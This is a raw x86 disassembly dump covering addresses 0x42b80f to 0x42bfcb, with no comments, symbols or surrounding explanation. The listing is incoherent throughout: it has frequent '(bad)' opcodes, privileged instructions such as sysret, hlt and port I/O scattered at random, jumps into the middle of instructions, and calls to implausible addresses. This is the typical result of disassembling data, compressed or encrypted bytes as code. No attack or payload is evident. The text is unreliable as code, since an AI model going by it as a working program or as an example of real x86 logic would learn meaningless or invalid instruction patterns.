  42b80f:	xor    edi,DWORD PTR [ebx+0x668a33]
  42b815:	mov    WORD PTR [ebx],?
  42b817:	cmp    al,0xbb
  42b819:	fs dec esi
  42b81b:	mov    eax,DWORD PTR [eax]
  42b81d:	pop    edi
  42b81e:	cmp    ecx,ecx
  42b820:	jne    0x42b877
  42b822:	mov    ebp,esp
  42b824:	cld    
  42b825:	push   esi
  42b826:	pop    ebx
  42b827:	inc    ebp
  42b828:	stc    
  42b829:	test   DWORD PTR ss:[eax+edi*8-0x317af642],ebx
  42b831:	clc    
  42b832:	test   dl,dl
  42b834:	notrack jmp DWORD PTR [esi+eiz*2+0x5e]
  42b839:	or     bl,al
  42b83b:	or     BYTE PTR [ebx+0x57665100],cl
  42b841:	retf   0x4245
  42b844:	add    BYTE PTR ss:[esi+eiz*2-0x457a3542],bl
  42b84c:	clc    
  42b84d:	add    BYTE PTR [ebx+0x66],bl
  42b850:	dec    edx
  42b852:	mov    edx,DWORD PTR [edi-0x76]
  42b855:	push   edi
  42b856:	add    al,0xb7
  42b858:	xor    al,0xba
  42b85a:	cmp    al,0x8d
  42b85c:	je     0x42b85d
  42b85e:	mov    edx,DWORD PTR [edi-0x46]
  42b861:	push   ecx
  42b862:	lea    edi,[ebx+0x574fff]
  42b868:	push   ecx
  42b869:	cmp    edx,DWORD PTR [ebx+0x75]
  42b86c:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  42b872:	add    BYTE PTR [ebx],dh
  42b874:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  42b87a:	add    BYTE PTR [ebx+esi*1+0x4f64bb3c],cl
  42b881:	mov    ebx,0x3b3b00
  42b886:	jne    0x42b8b3
  42b888:	mov    DWORD PTR [ebx+0x728afc],edi
  42b88e:	xor    esi,DWORD PTR [ebx]
  42b890:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  42b896:	push   edi
  42b897:	cmp    esp,ebp
  42b899:	jne    0x42b89b
  42b89b:	sbb    DWORD PTR [eax],0x8085c3fc
  42b8a1:	clc    
  42b8a2:	dec    ecx
  42b8a3:	pop    ebx
  42b8a4:	sti    
  42b8a5:	add    eax,0xeb8bc075
  42b8aa:	cld    
  42b8ab:	xor    edi,DWORD PTR ds:0xf8c3855e
  42b8b1:	mov    ecx,DWORD PTR [ecx+edx*2]
  42b8b4:	rol    DWORD PTR [ebp-0x37],0xf
  42b8b8:	mov    DWORD PTR [eax],ecx
  42b8ba:	inc    edi
  42b8bb:	(bad)  
  42b8bc:	in     eax,0xf8
  42b8be:	add    bh,bh
  42b8c0:	(bad)  
  42b8c1:	mov    esi,0xc38a5e
  42b8c6:	mov    esi,DWORD PTR [ebx]
  42b8c8:	push   ecx
  42b8c9:	mov    edi,0xfc4ec7
  42b8ce:	test   DWORD PTR [ebp-0x8],edx
  42b8d1:	xor    ax,0x9cc7
  42b8d5:	sub    ebp,eax
  42b8d7:	inc    ebp
  42b8d8:	(bad)  
  42b8d9:	sub    edi,edi
  42b8db:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  42b8e1:	inc    ebp
  42b8e2:	add    BYTE PTR [esi+0x2b],ah
  42b8e5:	or     bh,BYTE PTR [edx+0xf8ac2]
  42b8eb:	cmp    al,0x33
  42b8ed:	mov    edi,DWORD PTR [edx+0xf84e81]
  42b8f3:	(bad)  
  42b8f4:	cmp    esi,DWORD PTR [ebx]
  42b8f6:	je     0x42b8b0
  42b8f8:	push   ebx
  42b8f9:	dec    esi
  42b8fa:	str    ecx
  42b8fd:	cmp    esp,DWORD PTR [edx+0x75]
  42b900:	int    0x33
  42b902:	mov    edi,0x789085f
  42b907:	mov    esp,DWORD PTR [esp+edi*8+0x0]
  42b90b:	leave  
  42b90c:	data16 add al,0xcb
  42b90f:	push   ebp
  42b910:	add    ebp,esp
  42b912:	jne    0x42b900
  42b914:	(bad)  
  42b915:	mov    DWORD PTR [ecx],0xd685f7ec
  42b91b:	clc    
  42b91c:	xlat   BYTE PTR ds:[ebx]
  42b91d:	inc    ebp
  42b91e:	mov    esi,DWORD PTR [eax+edx*2]
  42b921:	pushf  
  42b922:	in     eax,0x8b
  42b924:	add    ah,ch
  42b926:	or     BYTE PTR [edi+0x0],dl
  42b929:	push   ecx
  42b92a:	add    ax,0x72cb
  42b92e:	inc    edx
  42b92f:	add    BYTE PTR [eax],al
  42b931:	inc    ebp
  42b932:	data16 (bad) 
  42b934:	retf   
  42b935:	lock mov edx,0x66f80085
  42b93b:	inc    ebp
  42b93c:	retf   
  42b93d:	xor    eax,ecx
  42b93f:	pushf  
  42b940:	jge    0x42b909
  42b942:	ss cld 
  42b944:	pushf  
  42b945:	test   DWORD PTR [edi-0x8],ebx
  42b948:	je     0x42b98f
  42b94a:	xor    esi,DWORD PTR ds:0x7020840
  42b950:	ror    BYTE PTR [ebp-0x37],0x8d
  42b954:	push   ebp
  42b955:	add    esp,ebp
  42b957:	jb     0x42b8e4
  42b959:	add    BYTE PTR [eax],cl
  42b95b:	dec    ebp
  42b95c:	mov    bh,0x81
  42b95e:	push   esi
  42b95f:	push   edi
  42b960:	adc    DWORD PTR [ecx-0x3c],0x429eff81
  42b967:	xor    al,BYTE PTR [eax]
  42b969:	mov    edx,DWORD PTR [edi+0x10]
  42b96c:	(bad)  
  42b96d:	scas   eax,DWORD PTR es:[edi]
  42b96e:	mov    edx,0x890f003b
  42b973:	in     eax,dx
  42b974:	cld    
  42b975:	add    BYTE PTR [ebx],bh
  42b977:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  42b97b:	dec    ebp
  42b97c:	or     BYTE PTR [ebx],ch
  42b97e:	ret    0x458b
  42b981:	lock jmp 0x42b975
  42b984:	mov    ecx,DWORD PTR [eax]
  42b986:	or     BYTE PTR [edi],al
  42b988:	mov    ecx,eax
  42b98a:	xor    DWORD PTR [edx+0x2],0x0
  42b98e:	mov    bh,0xc1
  42b990:	adc    BYTE PTR [eax],dh
  42b992:	iret   
  42b993:	inc    ebp
  42b994:	mov    DWORD PTR [ebx],0x4dfff8c4
  42b99a:	inc    BYTE PTR [ebx]
  42b99c:	mov    edx,0x661100f8
  42b9a1:	adc    al,bh
  42b9a3:	dec    ecx
  42b9a4:	fisttp WORD PTR [ecx+0x456604c0]
  42b9aa:	add    dh,BYTE PTR ds:0x75e0845
  42b9b0:	ret    0x4d
  42b9b3:	lea    ecx,[ebx+0x18728301]
  42b9b9:	add    BYTE PTR [ebp+0x45],al
  42b9bc:	xor    eax,0xc7009ce9
  42b9c1:	add    al,ch
  42b9c3:	inc    ebp
  42b9c4:	test   DWORD PTR [ebx-0x3eba0708],ecx
  42b9ca:	xor    eax,0x781084d
  42b9cf:	push   edi
  42b9d0:	sahf   
  42b9d1:	push   ecx
  42b9d2:	xor    al,BYTE PTR [ecx+0x32f89e89]
  42b9d8:	inc    ebp
  42b9d9:	cmp    edi,DWORD PTR ds:0xc78b9c76
  42b9df:	or     ah,dh
  42b9e1:	inc    ebp
  42b9e2:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  42b9e8:	xor    ecx,DWORD PTR [ebx-0x74747664]
  42b9ee:	in     al,dx
  42b9ef:	hlt    
  42b9f0:	push   edi
  42b9f1:	push   edi
  42b9f2:	push   ecx
  42b9f3:	push   ecx
  42b9f4:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  42b9fa:	sahf   
  42b9fb:	sahf   
  42b9fc:	xor    dh,BYTE PTR [edx]
  42b9fe:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  42ba04:	or     BYTE PTR [ebp+0x7],al
  42ba07:	mov    eax,ecx
  42ba09:	clc    
  42ba0a:	jb     0x42b9cd
  42ba0c:	add    BYTE PTR [ebp+0x55],cl
  42ba0f:	or     DWORD PTR [edi],0xc251d157
  42ba15:	add    DWORD PTR [ebx+0x32009e],0x8b76453b
  42ba1f:	mov    edi,eax
  42ba21:	or     cl,al
  42ba23:	inc    ebp
  42ba24:	dec    ebp
  42ba25:	mov    eax,DWORD PTR [ecx+0x514d570c]
  42ba2b:	or     WORD PTR [ecx],0x899e
  42ba30:	xor    cl,BYTE PTR [ebx+0x5776fc3b]
  42ba36:	mov    edx,DWORD PTR [ecx+0x8]
  42ba39:	mov    eax,DWORD PTR [ebp-0x8]
  42ba3c:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb262]
  42ba43:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  42ba49:	inc    ebp
  42ba4a:	dec    eax
  42ba4b:	add    ecx,DWORD PTR [ebx+0x574df0f8]
  42ba51:	add    edx,DWORD PTR [ecx-0x8]
  42ba54:	mov    ecx,DWORD PTR [ecx]
  42ba56:	clc    
  42ba57:	or     BYTE PTR [ebp+eax*2+0x4532409e],al
  42ba5e:	mov    ecx,ebp
  42ba60:	clc    
  42ba61:	(bad)  
  42ba62:	popf   
  42ba63:	inc    DWORD PTR [eax]
  42ba65:	ret    0x8b
  42ba68:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  42ba6e:	mov    edi,esp
  42ba70:	hlt    
  42ba71:	test   ecx,esi
  42ba73:	clc    
  42ba74:	or     BYTE PTR [ebp+0x7],al
  42ba77:	xor    al,0xc1
  42ba79:	pushf  
  42ba7a:	jb     0x42baaf
  42ba7c:	add    BYTE PTR [eax-0x3f],al
  42ba7f:	inc    eax
  42ba80:	daa    
  42ba81:	inc    ebp
  42ba82:	inc    ebp
  42ba83:	xor    eax,0x7f80803
  42ba88:	dec    ebp
  42ba89:	sahf   
  42ba8a:	add    esi,DWORD PTR [edx]
  42ba8c:	clc    
  42ba8d:	cmp    DWORD PTR [ecx],ecx
  42ba8f:	or     al,0x8
  42ba91:	add    al,BYTE PTR [ebp+0x2c]
  42ba94:	xor    eax,0x7350845
  42ba99:	or     BYTE PTR [ebp+0x7],cl
  42ba9c:	lea    ebx,[esi-0x748dcdff]
  42baa2:	add    BYTE PTR [eax*2-0x74b21438],cl
  42baa9:	mov    edx,DWORD PTR [eax]
  42baab:	cld    
  42baac:	dec    ebp
  42baad:	push   edi
  42baae:	sub    edx,DWORD PTR [ecx-0x75]
  42bab1:	add    eax,0xf172fc
  42bab6:	or     BYTE PTR [ebp+0x7],cl
  42bab9:	add    eax,ecx
  42babb:	or     al,0x72
  42babd:	add    DWORD PTR [eax],eax
  42babf:	mov    ebx,0x29c2c1
  42bac4:	inc    ebp
  42bac5:	mov    eax,DWORD PTR [ebx]
  42bac7:	cmp    eax,0x3004d1c
  42bacd:	xbegin 0x66c846c7
  42bad3:	clc    
  42bad4:	or     BYTE PTR [ebp+0x45],al
  42bad7:	xor    al,0x35
  42bad9:	pushf  
  42bada:	or     BYTE PTR [ebx+0x454d1007],cl
  42bae0:	lea    eax,[ebp+0x33727501]
  42bae6:	add    cl,ch
  42bae8:	inc    ebp
  42bae9:	add    bl,ch
  42baeb:	add    BYTE PTR [ebx+0x45850845],cl
  42baf1:	je     0x42ba7e
  42baf3:	push   ebx
  42baf4:	or     al,0x85
  42baf6:	dec    ebp
  42baf7:	std    
  42baf8:	mov    bh,bh
  42bafa:	mov    BYTE PTR [ebp-0x75],al
  42bafd:	mov    edi,eax
  42baff:	or     al,0x89
  42bb01:	inc    ebp
  42bb02:	clc    
  42bb03:	mov    esp,esp
  42bb05:	hlt    
  42bb06:	call   DWORD PTR [edi-0x37]
  42bb09:	push   edi
  42bb0a:	or     al,0x51
  42bb0c:	push   ebp
  42bb0d:	xor    ebp,esp
  42bb0f:	mov    esi,0x457251
  42bb14:	xor    eax,0xc7459cc6
  42bb19:	mov    edi,eax
  42bb1b:	or     al,0x85
  42bb1d:	add    al,bh
  42bb1f:	inc    eax
  42bb21:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  42bb25:	or     ah,bh
  42bb27:	inc    eax
  42bb28:	push   edi
  42bb29:	jmp    0x42bb7c
  42bb2b:	mov    eax,DWORD PTR ds:0xe8720c
  42bb31:	mov    DWORD PTR [ebp-0x8],eax
  42bb34:	jne    0x42bb7b
  42bb36:	jmp    0x42bac3
  42bb38:	mov    ebp,DWORD PTR [eax]
  42bb3a:	clc    
  42bb3b:	retf   0xff57
  42bb3e:	push   ecx
  42bb3f:	mov    DWORD PTR ds:0x757210,eax
  42bb45:	mov    ecx,DWORD PTR [ebp-0x4]
  42bb48:	sub    esp,DWORD PTR [ebx-0x77]
  42bb4b:	dec    DWORD PTR [eax*4-0x74ca8abb]
  42bb52:	or     ah,bh
  42bb54:	pop    es
  42bb55:	ds sahf 
  42bb57:	push   DWORD PTR [edx]
  42bb59:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  42bb5f:	(bad)  
  42bb60:	mov    bh,bh
  42bb62:	jmp    0x42bb50
  42bb64:	leave  
  42bb65:	jne    0x42bb6f
  42bb67:	call   0x2fb4c1
  42bb6c:	in     al,dx
  42bb6d:	dec    ebp
  42bb6e:	add    dh,BYTE PTR [ebx]
  42bb70:	add    BYTE PTR [ebx],al
  42bb72:	inc    ebp
  42bb73:	cmp    esi,DWORD PTR ds:0xc78b9c74
  42bb79:	or     al,0xf0
  42bb7b:	add    BYTE PTR [ebp+0x458bf845],al
  42bb81:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  42bb87:	adc    al,0x7
  42bb89:	enter  0x9fc0,0xa5
  42bb8d:	rol    BYTE PTR [eax],0x5e
  42bb90:	mov    ecx,ecx
  42bb92:	or     al,0xc
  42bb94:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  42bb9b:	jmp    0x42bb9c
  42bb9d:	push   ebp
  42bb9e:	mov    esp,ebp
  42bba0:	cld    
  42bba1:	inc    ebp
  42bba2:	inc    ebp
  42bba3:	or     DWORD PTR [ecx+0x457dec10],0x0
  42bbaa:	push   esi
  42bbab:	push   esi
  42bbac:	mov    edi,0x7af080f
  42bbb1:	add    bh,al
  42bbb3:	test   DWORD PTR [esi+0x3a7320f],ebx
  42bbb9:	add    BYTE PTR [ecx+0x4540100f],cl
  42bbbf:	mov    ebp,eax
  42bbc1:	mov    ebp,edi
  42bbc3:	lock call edx
  42bbc6:	fcom   DWORD PTR [ebp+0x45]
  42bbc9:	mov    eax,0x148a8b
  42bbce:	push   ecx
  42bbcf:	enter  0xc145,0x83
  42bbd3:	cmp    ecx,DWORD PTR [eax]
  42bbd5:	add    BYTE PTR [ebp+0x4d],al
  42bbd8:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  42bbde:	call   0xffa2b74d
  42bbe3:	cmp    eax,DWORD PTR [ebp-0xc]
  42bbe6:	jmp    DWORD PTR [eax+edx*1-0x4e]
  42bbea:	push   ebp
  42bbeb:	(bad)  
  42bbec:	call   0x33b9f0
  42bbf1:	mov    bh,0xdb
  42bbf3:	cld    
  42bbf4:	or     BYTE PTR [ebp+0x45],bl
  42bbf7:	(bad)  
  42bbf8:	call   0xff7cb888
  42bbfd:	add    al,BYTE PTR [ebp+0x37]
  42bc00:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  42bc06:	jne    0x42bc08
  42bc08:	(bad)  
  42bc09:	cmp    edi,esp
  42bc0b:	jne    0x42bc3e
  42bc0d:	mov    edi,edi
  42bc0f:	or     BYTE PTR [ebx-0x307f0b49],cl
  42bc15:	pop    ds
  42bc16:	into   
  42bc17:	je     0x42bbda
  42bc19:	mov    ebx,DWORD PTR [esi]
  42bc1b:	or     BYTE PTR [ebp-0x49],al
  42bc1e:	mov    esp,DWORD PTR [esi-0x77]
  42bc21:	mov    esi,0x8451f0c
  42bc26:	mov    eax,DWORD PTR [eax]
  42bc28:	or     al,0x66
  42bc2a:	sar    bl,0x3b
  42bc2d:	xor    esi,DWORD PTR [ebp+0x66]
  42bc30:	xor    ecx,edi
  42bc32:	pop    edi
  42bc33:	adc    bl,BYTE PTR [ebx+0x7c]
  42bc36:	ret    0xff
  42bc39:	cld    
  42bc3a:	inc    ebp
  42bc3b:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  42bc41:	cld    
  42bc42:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  42bc49:	push   0xffffff83
  42bc4b:	pop    edi
  42bc4c:	or     BYTE PTR [ebp+0x53],dh
  42bc4f:	xorps  xmm1,xmm2
  42bc52:	test   BYTE PTR [eax+eax*1],bh
  42bc55:	add    BYTE PTR [eax],al
  42bc57:	adc    eax,eax
  42bc59:	add    DWORD PTR [esp+edi*2-0xff7b00],0xffffffb7
  42bc61:	jmp    DWORD PTR [eax]
  42bc63:	ror    al,0x5e
  42bc66:	inc    ebp
  42bc67:	leave  
  42bc68:	xor    ecx,DWORD PTR [eax]
  42bc6a:	and    DWORD PTR [ebx-0x3ebd0708],ecx
  42bc70:	add    ah,al
  42bc72:	xor    edi,edi
  42bc74:	xor    DWORD PTR [ebx],0x66003308
  42bc7a:	mov    DWORD PTR [ebp-0xc],ecx
  42bc7d:	pcmpgtw mm0,mm0
  42bc80:	add    dl,ah
  42bc82:	leave  
  42bc83:	mov    edi,DWORD PTR [esi-0x7d]
  42bc86:	push   ax
  42bc88:	dec    ebp
  42bc89:	mov    esi,DWORD PTR [ebx-0x75]
  42bc8c:	lea    ebp,[eax-0x7c00ff08]
  42bc92:	xor    eax,DWORD PTR [eax]
  42bc94:	sysret 
  42bc96:	dec    ebp
  42bc97:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  42bc9e:	push   WORD PTR [ecx+0x8]
  42bca2:	jne    0x42bc65
  42bca4:	ud0    ecx,DWORD PTR [ecx]
  42bca7:	mov    edi,DWORD PTR [edx+0x660000ac]
  42bcad:	(bad)  
  42bcae:	iret   
  42bcaf:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  42bcb6:	cli    
  42bcb7:	inc    ebp
  42bcb8:	cmp    al,0x8d
  42bcba:	add    BYTE PTR [esi+0x2d],ah
  42bcbd:	inc    ebp
  42bcbe:	pop    ebp
  42bcbf:	lea    ecx,[edi]
  42bcc1:	mov    dl,bh
  42bcc3:	add    BYTE PTR [edi],cl
  42bcc5:	mov    DWORD PTR [eax+eax*8],edi
  42bcc8:	mov    ebx,0x3b87
  42bccd:	add    BYTE PTR [ebx],ch
  42bccf:	inc    ebp
  42bcd0:	data16 (bad) 
  42bcd2:	clc    
  42bcd3:	int3   
  42bcd4:	cmp    eax,DWORD PTR [eax]
  42bcd6:	je     0x42bc61
  42bcd8:	push   0xffffffc8
  42bcda:	pop    edi
  42bcdb:	xchg   DWORD PTR [ebp+0x0],eax
  42bcde:	data16 add BYTE PTR [ebp+0x45],cl
  42bce2:	lea    cx,[ebp+0x10]
  42bce6:	jb     0x42bce8
  42bce8:	jmp    0x42bc73
  42bcea:	call   eax
  42bcec:	clc    
  42bced:	xchg   DWORD PTR [edi+0x1],edi
  42bcf0:	mov    eax,DWORD PTR [eax]
  42bcf2:	or     BYTE PTR [ebp-0x49],al
  42bcf5:	lea    eax,[eax+0x74003154]
  42bcfb:	push   edi
  42bcfc:	inc    edx
  42bcfd:	jge    0x42bcfe
  42bcff:	mov    DWORD PTR [edi],ecx
  42bd01:	fdiv   DWORD PTR [edi-0x6]
  42bd04:	inc    DWORD PTR [eax]
  42bd06:	xor    edx,DWORD PTR [eax+0x5f]
  42bd09:	xchg   DWORD PTR [ebx+0x1],ebx
  42bd0c:	ret    0x0
  42bd0f:	xor    BYTE PTR [ebp-0x51],cl
  42bd12:	cmp    edi,0xf0ff89f8
  42bd18:	data16 ror al,0x84
  42bd1c:	rol    BYTE PTR [eax],0x3b
  42bd1f:	add    al,dh
  42bd21:	dec    eax
  42bd22:	xchg   esp,eax
  42bd23:	push   ebx
  42bd24:	jmp    0x42bcb1
  42bd26:	push   ebp
  42bd27:	add    esp,ebp
  42bd29:	add    ebp,esp
  42bd2b:	mov    edx,DWORD PTR [edi+0x24]
  42bd2e:	clc    
  42bd2f:	dec    esi
  42bd30:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  42bd36:	cmp    BYTE PTR [ebx],al
  42bd38:	jne    0x42bcc3
  42bd3a:	xor    esp,eax
  42bd3c:	jmp    0x45bebf
  42bd41:	add    ebp,DWORD PTR [ecx+ecx*4]
  42bd44:	jne    0x42bd3a
  42bd46:	call   0xffccbaa0
  42bd4b:	clc    
  42bd4c:	xchg   edi,eax
  42bd4d:	sti    
  42bd4e:	add    DWORD PTR [ebx],eax
  42bd50:	add    BYTE PTR [ebp+0x47],bl
  42bd53:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  42bd59:	pop    ebp
  42bd5a:	mov    DWORD PTR [esi-0x48],esi
  42bd5d:	jmp    0x42bda6
  42bd5f:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  42bd65:	(bad)  
  42bd67:	cmp    al,0x0
  42bd69:	cmp    eax,DWORD PTR [ebp+0x18]
  42bd6c:	lea    ebx,[ebp-0x56]
  42bd6f:	jle    0x42bd71
  42bd71:	jae    0x42bcfc
  42bd73:	mov    eax,esp
  42bd75:	call   0xb900:0x8b005587
  42bd7c:	inc    ebp
  42bd7d:	push   ebp
  42bd7e:	lea    ecx,[ebp-0x27ff4f12]
  42bd84:	mov    eax,edi
  42bd86:	int3   
  42bd87:	push   ebp
  42bd88:	xchg   edi,eax
  42bd8a:	add    esp,ebp
  42bd8c:	add    BYTE PTR [eax],al
  42bd8e:	inc    ebp
  42bd8f:	add    BYTE PTR [ebp+0x8b3255],cl
  42bd95:	cld    
  42bd96:	mov    DWORD PTR [edx],edi
  42bd98:	aam    0x75
  42bd9a:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  42bda0:	mov    DWORD PTR [ebx-0x50],edx
  42bda3:	test   BYTE PTR [ebp-0x1],0xe8
  42bda7:	mov    eax,DWORD PTR [eax]
  42bda9:	hlt    
  42bdaa:	add    al,al
  42bdac:	mov    eax,DWORD PTR ds:0x890045a8
  42bdb2:	dec    DWORD PTR [ebx+0x45fdf0e8]
  42bdb8:	inc    DWORD PTR [eax*2+0xf75854d]
  42bdbf:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  42bdc5:	call   0x72991b06
  42bdca:	je     0x42be2a
  42bdcc:	js     0x42be2d
  42bdce:	lock ret 0x7e
  42bdd2:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  42bdd8:	mov    edi,edi
  42bdda:	sbb    al,bl
  42bddc:	clc    
  42bddd:	add    BYTE PTR [ebp-0x73],bh
  42bde0:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  42bde6:	ror    BYTE PTR [eax],1
  42bde8:	dec    ebp
  42bde9:	xchg   ebp,eax
  42bdea:	mov    edi,edi
  42bdec:	in     al,0x8b
  42bdee:	jge    0x42bd79
  42bdf0:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  42bdf6:	clc    
  42bdf7:	pop    esi
  42bdf8:	fist   DWORD PTR [ebp+0x5d398b5d]
  42bdfe:	clc    
  42bdff:	add    al,0x6e
  42be01:	mov    eax,DWORD PTR [ebx]
  42be03:	mov    BYTE PTR [ebp+0x0],dl
  42be06:	mov    edx,DWORD PTR [ebx-0x20]
  42be09:	adc    esi,DWORD PTR [edi+0x5e005f42]
  42be0f:	add    eax,0x3b3b73
  42be14:	adc    al,0x89
  42be16:	pop    eax
  42be17:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  42be1b:	ret    0xf08
  42be1e:	cmp    al,0x2
  42be20:	mov    DWORD PTR [edx+0x665500fc],edi
  42be26:	add    eax,ebx
  42be28:	add    esp,eax
  42be2a:	sub    eax,eax
  42be2c:	or     BYTE PTR [ecx-0x77f474bb],cl
  42be32:	add    BYTE PTR [eax],al
  42be34:	mov    DWORD PTR [ebx-0x24],ebx
  42be37:	push   edi
  42be38:	push   ebp
  42be39:	clc    
  42be3a:	add    DWORD PTR [esi+0x1b0100],0x45
  42be41:	out    0xff,eax
  42be43:	add    edx,DWORD PTR [eax]
  42be45:	jmp    0x42be2f
  42be47:	cmp    ch,0x49
  42be4a:	(bad)  
  42be4b:	jmp    0x40c8469d
  42be50:	je     0x42bddc
  42be52:	mov    eax,DWORD PTR [eax-0x10c78304]
  42be58:	inc    ebp
  42be59:	add    BYTE PTR [ebx-0x770375],al
  42be5f:	add    ah,ch
  42be61:	add    edx,esp
  42be63:	pop    edi
  42be64:	pop    ebp
  42be65:	push   ebp
  42be66:	inc    ebx
  42be67:	in     al,dx
  42be68:	pop    ebp
  42be69:	in     al,dx
  42be6a:	cmp    edx,DWORD PTR [edi-0x8]
  42be6d:	xor    eax,0x895b9c94
  42be72:	leave  
  42be73:	call   0x8998057c
  42be78:	in     al,dx
  42be79:	in     al,0x45
  42be7b:	dec    ebp
  42be7c:	push   esi
  42be7d:	test   DWORD PTR [eax+0xfb010f],esi
  42be83:	add    BYTE PTR [eax+0xc018b],dh
  42be89:	leave  
  42be8a:	inc    ebp
  42be8b:	test   al,ch
  42be8d:	add    dh,bh
  42be8f:	add    bh,bh
  42be91:	dec    ebp
  42be92:	push   cs
  42be93:	mov    DWORD PTR [ecx],eax
  42be95:	hlt    
  42be96:	push   es
  42be97:	dec    ebp
  42be98:	leave  
  42be99:	mov    DWORD PTR [eax],ecx
  42be9b:	clc    
  42be9c:	cmovge eax,ecx
  42be9f:	mov    ecx,0x85c2f0
  42bea5:	clc    
  42bea6:	pop    DWORD PTR [ebp+0x1]
  42bea9:	push   ebx
  42beaa:	add    BYTE PTR [ebp-0x15],bh
  42bead:	push   esi
  42beae:	xor    eax,0x898a45
  42beb3:	cld    
  42beb4:	or     BYTE PTR [ebp+0x0],al
  42beb7:	xor    esp,DWORD PTR [esi-0x64]
  42beba:	add    DWORD PTR [esi+0x78308c1],edi
  42bec0:	add    ah,BYTE PTR [edx-0x49]
  42bec3:	int    0xbb
  42bec5:	mov    ecx,DWORD PTR [esi+0xc]
  42bec8:	add    dh,al
  42beca:	cmp    ecx,ebx
  42becc:	jne    0x42be96
  42bece:	xor    ecx,DWORD PTR [ebp+0x66]
  42bed1:	jmp    0xc9bed7
  42bed6:	add    DWORD PTR [ebp+0x0],eax
  42bed9:	mov    eax,ebx
  42bedb:	or     al,0x8b
  42bedd:	(bad)  
  42bede:	mov    ecx,esi
  42bee0:	mov    BYTE PTR [eax+eax*1+0x664c13c],cl
  42bee7:	mov    eax,edi
  42bee9:	or     BYTE PTR [edx],cl
  42beeb:	shl    cl,cl
  42beed:	icebp  
  42beee:	add    BYTE PTR [ebp+0x35],0x8b
  42bef2:	or     BYTE PTR [edx+eax*2],cl
  42bef5:	(bad)  
  42bef6:	or     cl,dh
  42bef8:	stc    
  42bef9:	shl    DWORD PTR [ebp-0x30],0xc6
  42befd:	xor    al,0x0
  42beff:	inc    ebp
  42bf00:	xchg   BYTE PTR [ebx],al
  42bf02:	add    esp,edi
  42bf04:	add    BYTE PTR [ebp-0x39],cl
  42bf07:	mov    al,bl
  42bf09:	test   DWORD PTR [ebx+0x1c348375],ecx
  42bf0f:	sub    al,0xbf
  42bf11:	jmp    0x42be98
  42bf13:	mov    edi,eax
  42bf15:	lock jge 0x42bf09
  42bf18:	lea    esi,[edx-0x74bad501]
  42bf1e:	mov    ebp,esp
  42bf20:	or     cl,dh
  42bf22:	leave  
  42bf23:	add    al,BYTE PTR [eax+eax*4-0x37ff9e00]
  42bf2a:	dec    ebp
  42bf2b:	dec    ebp
  42bf2c:	test   DWORD PTR [ebx],eax
  42bf2e:	paddb  mm6,mm0
  42bf31:	add    DWORD PTR [eax],eax
  42bf33:	dec    ebp
  42bf34:	mov    ecx,DWORD PTR [ebx-0x61b217f0]
  42bf3a:	mov    esi,DWORD PTR [edx]
  42bf3c:	or     al,0x2b
  42bf3e:	dec    ebp
  42bf3f:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  42bf45:	mov    esp,esp
  42bf47:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  42bf4e:	mov    DWORD PTR [ebx],ebp
  42bf50:	call   0xc764880
  42bf55:	mov    DWORD PTR [ebp+0x10],ecx
  42bf58:	(bad)  
  42bf59:	push   0x8b85ff10
  42bf5e:	clc    
  42bf5f:	or     al,0x57
  42bf61:	(bad)  
  42bf62:	push   ecx
  42bf63:	retf   
  42bf64:	mov    ebx,0xff4d8dc8
  42bf69:	mov    DWORD PTR [ebp+0x8],eax
  42bf6c:	xor    eax,DWORD PTR [ebp-0x75]
  42bf6f:	cmp    ebp,DWORD PTR [ebx]
  42bf71:	lsl    ebx,WORD PTR [edi-0x8]
  42bf75:	call   DWORD PTR [ebx-0x741bff75]
  42bf7b:	(bad)  
  42bf7c:	or     al,0x5b
  42bf7e:	dec    ebp
  42bf7f:	or     BYTE PTR [ebx],dh
  42bf81:	inc    ebp
  42bf82:	xor    esi,DWORD PTR ds:0x708088d
  42bf88:	in     eax,0x9e
  42bf8a:	add    BYTE PTR [edx],dh
  42bf8c:	inc    ebp
  42bf8d:	pop    edi
  42bf8e:	xor    eax,edx
  42bf90:	test   DWORD PTR [eax],0x83108b8b
  42bf96:	dec    ebp
  42bf97:	adc    al,0x33
  42bf99:	inc    ebp
  42bf9a:	xor    esi,DWORD PTR ds:0xc73b9c2b
  42bfa0:	jne    0x42bf9e
  42bfa2:	mov    eax,DWORD PTR [ebp+0x345f808]
  42bfa8:	mov    eax,DWORD PTR [ebp-0xc]
  42bfab:	mov    DWORD PTR [eax],0x685c9f4
  42bfb1:	clc    
  42bfb2:	dec    ecx
  42bfb3:	push   edi
  42bfb4:	xor    eax,0x4dd51745
  42bfb9:	xlat   BYTE PTR ds:[ebx]
  42bfba:	or     BYTE PTR [ebx+0x4d62fc57],0xd1
  42bfc1:	mov    eax,0x780084d
  42bfc6:	push   edi
  42bfc7:	clc    
  42bfc8:	ret    0xe99e
  42bfcb:	xor    dl,dl
